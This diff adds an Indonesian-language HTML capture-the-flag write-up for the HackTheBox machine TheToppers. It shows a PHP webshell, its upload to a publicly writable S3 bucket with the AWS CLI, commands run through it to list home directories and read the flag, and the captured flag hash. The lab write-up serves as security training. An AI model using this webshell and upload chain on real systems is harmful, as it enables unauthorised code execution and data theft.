@@ -1,0 +1,810 @@
+<!doctype html>
+<html lang="id">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Laporan Penetration Testing: TheToppers HTB</title>
+		<link
+			href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap"
+			rel="stylesheet" />
+		<style>
+			:root {
+				--bg-color: #0f172a;
+				--card-bg: #1e293b;
+				--accent-color: #0ea5e9;
+				--accent-hover: #38bdf8;
+				--text-primary: #f8fafc;
+				--text-secondary: #94a3b8;
+				--code-bg: #0b0f19;
+				--border-color: #334155;
+				--success-color: #10b981;
+				--warning-color: #f59e0b;
+				--danger-color: #ef4444;
+			}
+
+			* {
+				box-sizing: border-box;
+				margin: 0;
+				padding: 0;
+			}
+
+			body {
+				font-family: "Inter", sans-serif;
+				background-color: var(--bg-color);
+				color: var(--text-primary);
+				line-height: 1.6;
+				padding: 2rem 1rem;
+			}
+
+			.container {
+				max-width: 900px;
+				margin: 0 auto;
+			}
+
+			header {
+				text-align: center;
+				margin-bottom: 3rem;
+				border-bottom: 2px solid var(--border-color);
+				padding-bottom: 2rem;
+			}
+
+			h1 {
+				font-size: 2.2rem;
+				font-weight: 700;
+				color: var(--text-primary);
+				margin-bottom: 0.5rem;
+				letter-spacing: -0.05em;
+			}
+
+			.badge {
+				display: inline-block;
+				background-color: rgba(14, 165, 233, 0.15);
+				color: var(--accent-color);
+				padding: 0.25rem 0.75rem;
+				border-radius: 9999px;
+				font-size: 0.85rem;
+				font-weight: 600;
+				text-transform: uppercase;
+				border: 1px solid rgba(14, 165, 233, 0.3);
+			}
+
+			h2 {
+				font-size: 1.5rem;
+				color: var(--accent-color);
+				margin-top: 2.5rem;
+				margin-bottom: 1rem;
+				border-bottom: 1px solid var(--border-color);
+				padding-bottom: 0.5rem;
+				display: flex;
+				align-items: center;
+				gap: 0.5rem;
+			}
+
+			p {
+				color: var(--text-secondary);
+				margin-bottom: 1rem;
+				font-size: 1rem;
+			}
+
+			/* Steps list styling */
+			.steps-container {
+				display: flex;
+				flex-direction: column;
+				gap: 2.5rem;
+				margin-top: 2rem;
+			}
+
+			.step-card {
+				background-color: var(--card-bg);
+				border: 1px solid var(--border-color);
+				border-radius: 12px;
+				padding: 1.5rem;
+				box-shadow:
+					0 4px 6px -1px rgba(0, 0, 0, 0.1),
+					0 2px 4px -2px rgba(0, 0, 0, 0.1);
+			}
+
+			.step-header {
+				display: flex;
+				align-items: center;
+				justify-content: space-between;
+				margin-bottom: 1rem;
+			}
+
+			.step-title {
+				font-weight: 700;
+				font-size: 1.15rem;
+				color: var(--text-primary);
+			}
+
+			.step-number {
+				background-color: var(--accent-color);
+				color: var(--bg-color);
+				width: 28px;
+				height: 28px;
+				border-radius: 50%;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-weight: bold;
+				font-size: 0.9rem;
+			}
+
+			pre {
+				background-color: var(--code-bg);
+				border: 1px solid var(--border-color);
+				border-radius: 8px;
+				padding: 1rem;
+				overflow-x: auto;
+				margin-bottom: 1.25rem;
+			}
+
+			code {
+				font-family: "Fira Code", monospace;
+				font-size: 0.9rem;
+				color: #38bdf8;
+			}
+
+			.details-grid {
+				display: grid;
+				grid-template-columns: 1fr;
+				gap: 1rem;
+				margin-top: 1rem;
+			}
+
+			@media (min-width: 640px) {
+				.details-grid {
+					grid-template-columns: 1fr 1fr;
+				}
+			}
+
+			.detail-item {
+				background-color: rgba(15, 23, 42, 0.3);
+				border: 1px solid rgba(51, 65, 85, 0.5);
+				border-radius: 6px;
+				padding: 0.75rem 1rem;
+			}
+
+			.detail-item strong {
+				display: block;
+				color: var(--accent-hover);
+				font-size: 0.85rem;
+				text-transform: uppercase;
+				margin-bottom: 0.25rem;
+			}
+
+			.detail-item p {
+				margin-bottom: 0;
+				font-size: 0.9rem;
+				color: var(--text-primary);
+			}
+
+			.security-insight {
+				grid-column: 1 / -1;
+				background-color: rgba(16, 185, 129, 0.05);
+				border: 1px dashed var(--success-color);
+				border-radius: 6px;
+				padding: 0.75rem 1rem;
+			}
+
+			.security-insight strong {
+				color: var(--success-color);
+			}
+
+			/* Callout Box (Warning / Mistakes) */
+			.callout {
+				background-color: rgba(239, 68, 68, 0.05);
+				border-left: 4px solid var(--danger-color);
+				padding: 1.25rem;
+				border-radius: 0 8px 8px 0;
+				margin-top: 2rem;
+			}
+
+			.callout h4 {
+				color: var(--danger-color);
+				font-size: 1.1rem;
+				margin-bottom: 0.5rem;
+				display: flex;
+				align-items: center;
+				gap: 0.5rem;
+			}
+
+			.callout ul {
+				padding-left: 1.25rem;
+				color: var(--text-secondary);
+				font-size: 0.95rem;
+			}
+
+			.callout li {
+				margin-bottom: 0.5rem;
+			}
+
+			/* Conclusion section styles */
+			.summary-box {
+				background: linear-gradient(
+					135deg,
+					rgba(14, 165, 233, 0.1) 0%,
+					rgba(16, 185, 129, 0.1) 100%
+				);
+				border: 1px solid var(--border-color);
+				border-radius: 12px;
+				padding: 1.5rem;
+				margin-top: 1.5rem;
+			}
+
+			.summary-box p {
+				color: var(--text-primary);
+			}
+
+			.flag-box {
+				background-color: var(--code-bg);
+				border: 1px solid var(--success-color);
+				border-radius: 8px;
+				padding: 1rem;
+				text-align: center;
+				font-family: "Fira Code", monospace;
+				font-size: 1.2rem;
+				color: var(--success-color);
+				margin-top: 1rem;
+				font-weight: bold;
+				letter-spacing: 0.05em;
+			}
+
+			/* Styling Tombol Back Khusus */
+			.back-btn-container {
+				display: flex;
+				justify-content: flex-start;
+				margin-top: 1rem;
+			}
+
+			.back-btn {
+				display: inline-flex;
+				align-items: center;
+				gap: 10px;
+				background-color: rgba(30, 41, 59, 0.7);
+				color: var(--text-primary);
+				text-decoration: none;
+				font-size: 0.95rem;
+				font-weight: 600;
+				padding: 0.75rem 1.5rem;
+				border-radius: 8px;
+				border: 1px solid var(--border-color);
+				transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+				cursor: pointer;
+				backdrop-filter: blur(8px);
+			}
+
+			.back-btn:hover {
+				background-color: var(--accent-color);
+				color: var(--bg-color);
+				border-color: var(--accent-hover);
+				box-shadow: 0 0 15px rgba(14, 165, 233, 0.4);
+				transform: translateX(
+					-4px
+				); /* Efek meluncur ke kiri sedikit saat di-hover */
+			}
+
+			.back-btn i {
+				font-size: 0.9rem;
+				transition: transform 0.3s ease;
+			}
+
+			.back-btn:hover i {
+				transform: translateX(-2px);
+			}
+		</style>
+	</head>
+	<body>
+		<div class="container">
+			<header>
+				<span class="badge">Penetration Testing Report</span>
+				<h1>Eksploitasi S3 Bucket & Remote Code Execution (RCE)</h1>
+				<p>Target Mesin: <strong>TheToppers.htb (HackTheBox)</strong></p>
+			</header>
+
+			<section>
+				<h2>Tujuan</h2>
+				<p>
+					Tujuan dari kegiatan pengujian penetrasi ini adalah untuk
+					mengidentifikasi kelemahan konfigurasi pada subdomain S3 target,
+					mengeksploitasi hak akses tulis (write permission) publik, mengunggah
+					payload webshell PHP, serta mengeksekusi perintah jarak jauh (Remote
+					Code Execution) guna memperoleh berkas bendera bukti kompromi (flag).
+				</p>
+			</section>
+
+			<section>
+				<h2>Latar Belakang</h2>
+				<p>
+					Penyimpanan objek S3 (Simple Storage Service) sering diandalkan untuk
+					menampung data statis aplikasi web. Namun, kesalahan konfigurasi
+					berupa pemberian izin akses tulis kepada publik (Anonymous Write)
+					memungkinkan aktor jahat mengunggah berkas eksekusi. Ketika bucket S3
+					dipetakan secara langsung ke direktori akar web (web root) yang
+					mengaktifkan interpreter backend seperti PHP, hal ini langsung membuka
+					jalur eksploitasi <strong>Remote Code Execution (RCE)</strong>. RCE
+					adalah kerentanan tingkat kritis karena memberikan kendali penuh
+					sistem operasi host kepada penyerang melalui antarmuka web.
+				</p>
+			</section>
+
+			<section>
+				<h2>Langkah-langkah Eksploitasi</h2>
+				<div class="steps-container">
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title">Pendaftaran Resolusi Domain Lokal</span>
+							<span class="step-number">1</span>
+						</div>
+						<pre><code>sudo nano /etc/hosts</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Membuka berkas konfigurasi resolusi nama host lokal
+									menggunakan text editor nano dengan hak akses administratif.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Memetakan domain target (thetoppers.htb dan s3.thetoppers.htb)
+									ke alamat IP mesin HTB secara lokal agar dapat diselesaikan
+									oleh sistem.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>Tampilan teks editor nano yang memuat isi berkas hosts.</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>
+									Sistem lokal siap ditambahkan aturan routing DNS lokal buatan.
+								</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Resolusi nama host
+								manual memotong proses kueri DNS publik, memastikan penguji
+								terhubung ke server target lokal virtual secara stabil tanpa
+								memerlukan setup server DNS penuh.
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title">Verifikasi Koneksi Subdomain S3</span>
+							<span class="step-number">2</span>
+						</div>
+						<pre><code>curl http://s3.thetoppers.htb</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Mengirimkan permintaan HTTP GET ke subdomain
+									s3.thetoppers.htb.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Memastikan subdomain penyimpanan S3 merespons dengan benar dan
+									layanannya aktif.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>{"status": "running"}</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>
+									Subdomain berjalan dan menggunakan emulator/layanan
+									penyimpanan objek yang aktif di port 80/HTTP.
+								</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Information Gathering &
+								Active Reconnaissance. Langkah ini memastikan target operasional
+								sebelum payload disiapkan.
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title">Inisialisasi Profil AWS CLI</span>
+							<span class="step-number">3</span>
+						</div>
+						<pre><code>aws configure</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Mengonfigurasi parameter profil kredensial untuk utilitas AWS
+									Command Line Interface.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									AWS CLI membutuhkan struktur data konfigurasi dasar (meskipun
+									berupa isian palsu/dummy) agar dapat memproses kueri API ke
+									penyimpanan S3 lokal target.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>
+									Prompt pengisian Access Key, Secret Key, Region, dan Format
+									output.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>Alat lokal siap merumuskan perintah manajemen bucket S3.</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Banyak integrasi tiruan
+								S3 (seperti LocalStack) tidak memvalidasi kredensial AWS secara
+								kriptografis selama izin tulis anonim terbuka bebas.
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title">Pembuatan Payload Webshell</span>
+							<span class="step-number">4</span>
+						</div>
+						<pre><code>cat &gt; shell.php &lt;&lt; 'EOF'
+&lt;?php
+if(isset($_REQUEST['cmd'])){
+    system($_REQUEST['cmd']);
+}
+?&gt;
+EOF</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Membuat berkas bernama shell.php dan menyalin kode PHP
+									pengeksekusi sistem di dalamnya.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Membuat backdoor sederhana berbasis web yang menerima
+									parameter perintah 'cmd' dari penyerang.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>Berkas shell.php berhasil dibuat tanpa pesan galat.</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>Payload backdoor siap dikirimkan ke server target.</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Penyalahgunaan fungsi
+								internal sistem operasi. Fungsi PHP <code>system()</code> akan
+								meneruskan string langsung ke OS Host Linux shell.
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title">Integritas Berkas Payload</span>
+							<span class="step-number">5</span>
+						</div>
+						<pre><code>cat shell.php</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Membaca dan menampilkan isi file shell.php ke terminal lokal.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Melakukan tinjauan kode cepat guna memastikan tidak ada
+									sintaks atau karakter yang rusak sebelum diunggah.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>
+									Kode PHP persis seperti yang diinput di langkah sebelumnya.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>Integritas berkas lokal terjamin.</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Quality Control &
+								Integrity Verification. Melakukan verifikasi payload lokal
+								mencegah kegagalan eksekusi pasca-unggahan yang mencurigakan.
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title"
+								>Eksploitasi Upload File Melalui S3 API</span
+							>
+							<span class="step-number">6</span>
+						</div>
+						<pre><code>aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Mengunggah file shell.php ke s3 bucket target dengan
+									mengalihkan endpoint API ke URL lokal server target.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Mengambil keuntungan dari miskonfigurasi hak akses tulis
+									terbuka (Write Permissions) pada S3 bucket target.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>upload: ./shell.php to s3://thetoppers.htb/shell.php</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>
+									File backdoor berhasil diletakkan pada akar direktori web
+									target.
+								</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Broken Access Control
+								(Miskonfigurasi Penyimpanan Awan). Server S3 tidak menerapkan
+								otentikasi / otorisasi yang memadai untuk operasi tulis
+								(s3:PutObject).
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title"
+								>Verifikasi Eksekusi dan Pemetaan Home</span
+							>
+							<span class="step-number">7</span>
+						</div>
+						<pre><code>curl "http://thetoppers.htb/shell.php?cmd=ls+/home"</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Mengirim perintah sistem 'ls /home' lewat parameter cmd
+									webshell.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Memastikan RCE berhasil berjalan dan mengetahui daftar nama
+									direktori pengguna (user) di server target.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>Daftar pengguna (misalnya: svc).</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>
+									RCE aktif sepenuhnya dan berjalan di bawah hak akses user web
+									(biasanya www-data).
+								</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Remote Code Execution
+								(RCE) dikombinasikan dengan Enumerasi Sistem Awal untuk mencari
+								keberadaan user target lokal.
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title">Enumerasi Folder Pribadi Pengguna</span>
+							<span class="step-number">8</span>
+						</div>
+						<pre><code>curl "http://thetoppers.htb/shell.php?cmd=ls+-la+/home/svc"</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Mencetak berkas tersembunyi dan hak milik folder pribadi user
+									'svc'.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Mengidentifikasi file-file sensitif, konfigurasi, atau kunci
+									SSH pribadi untuk potensi eskalasi hak akses.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>Isi lengkap beserta permissions dari /home/svc.</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>
+									Penguji dapat menganalisis file mana saja yang dapat dibaca
+									oleh user proses web server.
+								</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Post-Exploitation
+								Enumeration. Menilai sejauh mana batasan pembatasan hak akses
+								lokal (Local Privilege Isolation) diterapkan.
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title">Pencarian Dinamis Lokasi Flag</span>
+							<span class="step-number">9</span>
+						</div>
+						<pre><code>curl "http://thetoppers.htb/shell.php?cmd=find+/+-iname+'*flag*'+2>/dev/null"</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>
+									Mencari file dengan nama "flag" tanpa memedulikan sensitivitas
+									huruf besar/kecil di seluruh sistem.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Menemukan lokasi penyimpanan flag secara cepat tanpa harus
+									menjelajahi direktori satu per satu.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>Jalur file flag, misalnya: /var/www/flag.txt</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>
+									Lokasi eksak dari sasaran utama (flag) berhasil
+									diidentifikasi.
+								</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Filtering Output & File
+								Hunting. Mengabaikan pesan galat menggunakan
+								<code>2>/dev/null</code> menyederhanakan parsing data hasil
+								pencarian.
+							</div>
+						</div>
+					</div>
+
+					<div class="step-card">
+						<div class="step-header">
+							<span class="step-title"
+								>Pembacaan Konten Flag (Eksfiltrasi)</span
+							>
+							<span class="step-number">10</span>
+						</div>
+						<pre><code>curl "http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt"</code></pre>
+						<div class="details-grid">
+							<div class="detail-item">
+								<strong>Fungsi Command</strong>
+								<p>Membaca konten teks dari file target /var/www/flag.txt.</p>
+							</div>
+							<div class="detail-item">
+								<strong>Alasan Penggunaan</strong>
+								<p>
+									Memperoleh string token flag guna melengkapi bukti
+									keberhasilan penetrasi sistem secara sah.
+								</p>
+							</div>
+							<div class="detail-item">
+								<strong>Output yang Diharapkan</strong>
+								<p>MD5/Hex Hash String (flag target).</p>
+							</div>
+							<div class="detail-item">
+								<strong>Arti Output</strong>
+								<p>
+									Serangan berhasil secara penuh dari luar sistem hingga
+									kompromi data dalam.
+								</p>
+							</div>
+							<div class="security-insight">
+								<strong>Konsep Keamanan Siber:</strong> Data Exfiltration. Tahap
+								akhir di mana informasi rahasia ditarik keluar dari perimeter
+								sistem yang dikompromikan.
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+
+			<section>
+				<h2>Analisis Dampak & Eksploitasi</h2>
+				<p>
+					Eksploitasi ini memanfaatkan kerentanan berantai (Chained
+					Vulnerability):
+				</p>
+				<p>
+					Pertama, S3 Bucket dikonfigurasi secara keliru yang mengizinkan tulis
+					tanpa otentikasi. Kedua, lingkungan web menggunakan PHP yang
+					mengizinkan eksekusi fungsi OS berbahaya seperti
+					<code>system()</code> tanpa pembatasan fungsi (disable_functions pada
+					php.ini). Dampak nyata dari skenario ini adalah hilangnya aspek
+					<strong>Confidentiality (Kerahasiaan)</strong>,
+					<strong>Integrity (Integritas)</strong>, dan
+					<strong>Availability (Ketersediaan)</strong> karena penyerang dapat
+					menghapus web root, membaca berkas rahasia, atau menyematkan malware
+					lebih lanjut.
+				</p>
+			</section>
+
+			<section>
+				<h2>Kesimpulan</h2>
+				<div class="summary-box">
+					<p>
+						Pengujian penetrasi terhadap mesin
+						<strong>TheToppers</strong> berhasil membuktikan adanya celah
+						keamanan kritis pada kontrol akses S3 Bucket. Bukti kompromi
+						berhasil diamankan dengan eksfiltrasi flag enkripsi berikut:
+					</p>
+					<div class="flag-box">a980d99281a28d638ac68b9bf9453c2b</div>
+				</div>
+			</section>
+
+			<section class="callout">
+				<h4>⚠️ Potensi Kesalahan Umum (Common Mistakes)</h4>
+				<ul>
+					<li>
+						<strong>Kesalahan Penulisan Domain:</strong> Melewatkan pemetaan
+						subdomain <code>s3.thetoppers.htb</code> pada file
+						<code>/etc/hosts</code> yang membuat utilitas AWS CLI gagal
+						tersambung ke endpoint tiruan target.
+					</li>
+					<li>
+						<strong>Lupa Parameter Tanda Kutip 'EOF':</strong> Saat menuliskan
+						command <code>cat &gt; shell.php &lt;&lt; 'EOF'</code>, jika
+						melewatkan tanda kutip pada kata <code>'EOF'</code>, terminal shell
+						lokal Anda akan mengevaluasi variabel PHP
+						<code>$_REQUEST</code> sebagai variabel lokal terminal, menghasilkan
+						file webshell kosong di server target.
+					</li>
+					<li>
+						<strong>Tidak Mengonfigurasi Profil AWS CLI:</strong> Mencoba
+						menjalankan command <code>aws s3 cp</code> tanpa menjalankan
+						<code>aws configure</code> terlebih dahulu akan memicu kesalahan
+						bahwa tidak ada kredensial yang dimuat oleh sistem lokal.
+					</li>
+				</ul>
+			</section>
+
+			<div class="back-btn-container">
+				<a href="../index.html#projects" class="back-btn">
+					<i class="fa-solid fa-arrow-left"></i> Back to Projects
+				</a>
+			</div>
+		</div>
+	</body>
+</html>
